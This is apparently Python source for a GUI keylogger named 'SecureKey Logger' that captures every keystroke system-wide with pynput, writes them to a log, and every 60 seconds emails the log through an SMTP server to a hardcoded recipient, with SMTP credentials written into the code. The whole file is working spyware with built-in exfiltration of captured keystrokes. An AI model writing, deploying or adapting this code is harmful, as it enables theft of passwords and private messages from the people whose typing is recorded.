import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import logging
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time

# === Setup Logging ===
log_dir = "key_logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "keystrokes.log")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")


# === Keylogger Class ===
class KeyLogger:
    def __init__(self):
        self.listener = None
        self.is_running = False

    def on_press(self, key):
        try:
            logging.info(f"{key.char}")
        except AttributeError:
            logging.info(f"[{key}]")

    def start(self):
        if not self.is_running:
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()
            self.is_running = False


logger = KeyLogger()


# === Email Sender (Mailtrap) ===
def send_log_via_email():
    sender_email = "nocap7884@gmail.com"
    receiver_email = "cubaloveu333@gmail.com"

    smtp_server = "sandbox.smtp.mailtrap.io"
    smtp_port = 587
    smtp_user = "b8a2efcb10f57d"
    smtp_pass = "383ab60e6bb0d1"

    try:
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg["Subject"] = "🔐 Keystroke Log Update"

        msg.attach(MIMEText("Attached is the latest keystroke log.", "plain"))

        with open(log_file, "rb") as file:
            attachment = MIMEApplication(file.read(), _subtype="log")
            attachment.add_header("Content-Disposition", "attachment", filename="keystrokes.log")
            msg.attach(attachment)

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_pass)
            server.send_message(msg)

        print("✅ Log file sent successfully.")

    except Exception as e:
        print(f"❌ Error sending email: {e}")


# === Background Email Scheduler ===
def auto_email_sender():
    while True:
        time.sleep(60)  # Wait for 60 seconds
        send_log_via_email()


# === GUI App ===
class App:
    def __init__(self, root):
        self.root = root
        root.title("SecureKey Logger")
        root.geometry("500x400")
        root.config(bg="#1e1e2f")
        root.resizable(False, False)

        self.status_label = tk.Label(root, text="Status: Not Running", fg="red",
                                     bg="#1e1e2f", font=("Arial", 12))
        self.status_label.pack(pady=10)

        self.start_btn = tk.Button(root, text="Start Logging", width=20, bg="#00cc66", fg="white",
                                   command=self.start_logger)
        self.start_btn.pack(pady=5)

        self.stop_btn = tk.Button(root, text="Stop Logging", width=20, bg="#cc0000", fg="white",
                                  command=self.stop_logger)
        self.stop_btn.pack(pady=5)

        self.view_btn = tk.Button(root, text="View Logs", width=20, bg="#0066cc", fg="white",
                                  command=self.view_logs)
        self.view_btn.pack(pady=5)

        self.logger = KeyLogger()
        self.email_thread_started = False

    def start_logger(self):
        self.logger.start()
        self.status_label.config(text="Status: Running", fg="lime")
        if not self.email_thread_started:
            threading.Thread(target=auto_email_sender, daemon=True).start()
            self.email_thread_started = True

    def stop_logger(self):
        self.logger.stop()
        self.status_label.config(text="Status: Not Running", fg="red")

    def view_logs(self):
        if os.path.exists(log_file):
            with open(log_file, "r") as file:
                content = file.read()
            view_win = tk.Toplevel(self.root)
            view_win.title("Keystroke Logs")
            text_area = tk.Text(view_win, wrap=tk.WORD, width=60, height=20)
            text_area.insert(tk.END, content)
            text_area.pack()
        else:
            messagebox.showinfo("No Logs", "No log file found.")


# === Launch App ===
if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
